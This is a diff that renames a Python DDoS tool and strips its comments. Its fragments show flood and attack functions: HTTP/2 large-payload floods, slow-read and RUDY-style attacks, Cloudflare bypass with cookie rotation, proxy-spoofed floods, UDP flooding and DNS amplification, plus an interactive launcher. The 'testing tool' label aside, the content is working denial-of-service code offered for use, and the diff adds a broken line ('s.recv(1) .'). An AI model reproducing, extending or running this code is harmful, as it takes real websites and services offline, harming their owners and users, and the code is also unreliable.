@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# cilok.py – Ultimate DDoS Testing Tool
-# Usage: python cilok.py <method> <target> <threads> <time> [options]
+# eagle.py – DDoS Testing Tool
+# Usage: python3 eagle.py <method> <target> <threads> <time> [options]
 
 import os
 import sys
@@ -22,7 +22,7 @@ import undetected_chromedriver as webdriver
 
 # ------------------------- Global Settings -------------------------
 VERSION = "3.0"
-LOG_FILE = "cilok.log"
+LOG_FILE = "eagle.log"
 logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -181,7 +181,6 @@ def spoof(target):
 
 # ------------------------- Attack methods -------------------------
 
-# --- Basic L7 ---
 def LaunchHEAD(url, th, t, stats=None, delay=0.1, timeout=10):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     for _ in range(int(th)):
@@ -506,8 +505,7 @@ def AttackPXSPOOF(target, until_datetime, proxy, stats, delay, timeout):
             if stats: stats['errors'] += 1
             s.close()
             return
-
-# --- CF Bypass with cookie rotation ---
+          
 def LaunchCFPRO(url, th, t, stats=None, delay=0.1, timeout=10):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     cookies_list = []
@@ -595,7 +593,7 @@ def AttackCFSOC(target, until_datetime, cookie_str, stats, delay, timeout):
             s.close()
             return
 
-# --- Sky & Stellar ---
+
 def attackSKY(url, timer, threads, stats=None, delay=0.1, timeout=10):
     if not proxies:
         print("[*] No proxies loaded.")
@@ -657,7 +655,7 @@ def LaunchSTELLAR(url, timer, stats, delay, timeout):
             if stats: stats['errors'] += 1
             s.close()
 
-# --- NEW ULTIMATE METHODS ---
+
 
 def LaunchHTTP2_LARGE(url, th, t, stats=None, delay=0.1, timeout=10):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -666,7 +664,7 @@ def LaunchHTTP2_LARGE(url, th, t, stats=None, delay=0.1, timeout=10):
 
 def AttackHTTP2_LARGE(url, until_datetime, stats, delay, timeout):
     client = httpx.Client(http2=True)
-    large_payload = random._urandom(1024 * 1024)  # 1MB
+    large_payload = random._urandom(1024 * 1024)  
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             client.post(url, headers=random_headers(), data=large_payload, timeout=timeout)
@@ -721,7 +719,7 @@ def AttackSLOWREAD(target, until_datetime, stats, delay, timeout):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             s.send(req.encode())
-            s.recv(1)  # read only 1 byte
+            s.recv(1) .
             time.sleep(random.uniform(0.5, 2))
             if stats: stats['total'] += 1
         except:
@@ -871,11 +869,11 @@ def AttackRUDEAD(target, until_datetime, stats, delay, timeout):
             s.close()
             return
 
-# --- DNS Amplification (requires dnspython) ---
+
 try:
     import dns.message, dns.rdatatype, dns.edns
     def LaunchDNS_AMP(url, th, t, stats=None, delay=0.1, timeout=10):
-        # url should be IP address of DNS resolver, port 53
+      
         until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
         domain = "example.com"
         query = dns.message.make_query(domain, dns.rdatatype.A)
@@ -901,7 +899,7 @@ except ImportError:
     DNS_AVAILABLE = False
     print("[*] dnspython not installed. DNS amplification disabled.")
 
-# --- L4 methods ---
+
 def runflooder(host, port, th, t, stats=None, timeout=10):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     rand = random._urandom(1024)
@@ -940,7 +938,6 @@ def sender_udp(host, port, until_datetime, payload, stats, timeout):
             s.close()
             return
 
-# ------------------------- Interactive mode -------------------------
 def get_info_l7():
     target = input("URL      : ")
     thread = input("THREAD   : ")
@@ -993,7 +990,7 @@ def interactive():
         elif cmd in ("help", "?"):
             show_help()
         else:
-            # Parse arguments for command
+            
             parts = cmd.split()
             method = parts[0]
             if method in ("http2", "pxhttp2", "cfb", "pxcfb", "pps", "spoof", "pxspoof",
@@ -1113,7 +1110,7 @@ def interactive():
             else:
                 print(f"Unknown command: {method}. Type 'help' for list.")
 
-# ------------------------- Main entry -------------------------
+
 if __name__ == '__main__':
     load_user_agents()
     if len(sys.argv) == 1:
@@ -1144,7 +1141,7 @@ if __name__ == '__main__':
         delay = args.delay
         timeout = args.timeout
 
-        # L7 methods
+        
         if method == "get":
             LaunchRAW(target, threads, t, stats, delay, timeout)
         elif method == "post":
